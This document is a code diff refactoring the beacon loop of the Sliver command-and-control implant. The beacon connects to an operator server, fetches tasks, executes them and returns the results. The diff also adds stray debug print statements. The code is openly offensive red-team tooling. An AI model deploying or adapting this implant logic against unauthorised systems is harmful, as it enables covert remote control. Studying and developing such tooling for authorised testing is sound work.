@@ -21,31 +21,18 @@ package c2
 import (
 	// {{if .Config.Debug}}
 	"log"
-
 	// {{end}}
 
+	"fmt"
 	"sync"
 	"time"
 
-	"github.com/gofrs/uuid"
 	"github.com/golang/protobuf/proto"
 
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
-
-// BeaconID - A unique ID for the entire lifetime of this
-// session as beacon: might need to change this way to proceed.
-var BeaconID string
-
-func init() {
-	id, err := uuid.NewV4()
-	if err != nil {
-		BeaconID = "00000000-0000-0000-0000-000000000000"
-	}
-	BeaconID = id.String()
-}
 
 // Beacon - A Beacon is a slightly more evolved type of Channel, but only so: under the hood,
 // a beacon is continually spawning Session types, communicates over them with the server for
@@ -69,7 +56,8 @@ func NewBeacon(t *transports.Driver) (b *Beacon) {
 }
 
 // Start - Start the complete C2 stack for the first time (actually
-// sets up a Session) over which we will register this beacon.
+// sets up a Session) over which we will register this beacon. The returned
+// connection is used to send a registration message, or any other use.
 func (b *Beacon) Start() (err error) {
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode (Transport ID: %s)", b.ID)
@@ -78,10 +66,31 @@ func (b *Beacon) Start() (err error) {
 	// The transport is not closed anymore, if it was
 	b.closed = make(chan struct{}, 1)
 
-	// We simply return without connecting anywhere:
-	// each connection is handled either through the
-	// beacon loop, or through one-off Send() calls,
-	// which are used to register us.
+	// Make a copy of our own driver by instantiating a new one.
+	// This driver is the sole one in charge for this beaconing.
+	driver, err := transports.NewTransportFromExisting(b.Driver)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error creating beaconing transport driver: %s", err)
+		// {{end}}
+		b.FailedAttempt()
+		return
+	}
+
+	// Instantiate a new Session around this transport driver.
+	session := NewSession(driver)
+	defer b.RefreshStatistics(session.Driver)
+
+	// We're now ready to start the Session per-se.
+	err = session.Start()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error starting beaconing session: %s", err)
+		// {{end}}
+		return
+	}
+	session.Close()
+
 	return
 }
 
@@ -121,6 +130,7 @@ LOOP:
 		// run: when attempting to connect. But if that was the case
 		// we would not get to that point anyway.
 		if _, failures := b.Statistics(); failures == int(b.MaxConnectionErrors) {
+			fmt.Println(failures)
 			Transports.transportErrors <- ErrMaxAttempts
 			return
 		}
@@ -157,12 +167,12 @@ func (b *Beacon) BeaconOnce(duration time.Duration) (err error) {
 		b.FailedAttempt()
 		return
 	}
-	defer b.RefreshStatistics(driver)
 
 	// Instantiate a new Session around this transport driver:
 	// this provides with either/and/or the TLV ReadWriter system,
 	// and any session-based C2 channel.
 	session := NewSession(driver)
+	defer b.RefreshStatistics(session.Driver)
 
 	// We're now ready to start the Session per-se, which can be ranging from
 	// simply wrapping an underlying net.Conn with a TLV ReadWriter on top, or
@@ -182,7 +192,7 @@ func (b *Beacon) BeaconOnce(duration time.Duration) (err error) {
 	// {{end}}
 	nextCheckin := time.Now().Add(duration)
 	session.Send(transports.Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
-		ID:          BeaconID,
+		ID:          transports.BeaconID,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 
@@ -224,7 +234,7 @@ func (b *Beacon) BeaconOnce(duration time.Duration) (err error) {
 	// Send the results back to the server: the underlying connection stack
 	// will not be closed until the beacon has tried to write them to it.
 	session.Send(transports.Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
-		ID:    BeaconID,
+		ID:    transports.BeaconID,
 		Tasks: results,
 	}))
 
@@ -245,7 +255,7 @@ func (b *Beacon) ExecuteTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] execute task %#d", task.ID)
+		log.Printf("[beacon] execute task #%d", task.ID)
 		log.Printf("         Type          %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
@@ -305,11 +315,11 @@ func (b *Beacon) ExecuteTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 
 // Send - Again, the beacon's Send() method is a bit more complicated than Sessions':
 // it starts a complete protocol stack and a Session on top, write the message and exits.
-func (b *Beacon) Send(req *pb.Envelope) {
+func (b *Beacon) Send(req *pb.Envelope) (err error) {
 
 	// Make a copy of our own driver by instantiating a new one.
 	// This driver is the sole one in charge for this beaconing.
-	driver, err := transports.NewTransportFromProfile(b.Profile())
+	driver, err := transports.NewTransportFromExisting(b.Driver)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Error creating beaconing transport driver: %s", err)
@@ -317,12 +327,12 @@ func (b *Beacon) Send(req *pb.Envelope) {
 		b.FailedAttempt()
 		return
 	}
-
 	// At the end of the run, update our own driver with
 	// attempt/failures from the copy, beaconing one.
 
 	// Instantiate a new Session around this transport driver.
 	session := NewSession(driver)
+	defer b.RefreshStatistics(session.Driver)
 
 	// We're now ready to start the Session per-se.
 	err = session.Start()
@@ -332,17 +342,12 @@ func (b *Beacon) Send(req *pb.Envelope) {
 		// {{end}}
 		return
 	}
-	defer func() {
-		err = session.Close()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Error closing beaconing session: %s", err)
-			// {{end}}
-		}
-	}()
+	defer session.Close()
 
 	// Write the envelope to the connection
 	session.Send(req)
+
+	return
 }
 
 // Close - Notifies the beacon serve goroutine that we must close, so no more runs.
@@ -371,5 +376,10 @@ func (b *Beacon) RefreshStatistics(child *transports.Driver) (err error) {
 	for i := 0; i < (childFailures - parentFailures); i++ {
 		b.FailedAttempt()
 	}
+
+	_, parentFailures = b.Statistics()
+	_, childFailures = child.Statistics()
+	fmt.Println(parentFailures)
+	fmt.Println(childFailures)
 	return
 }
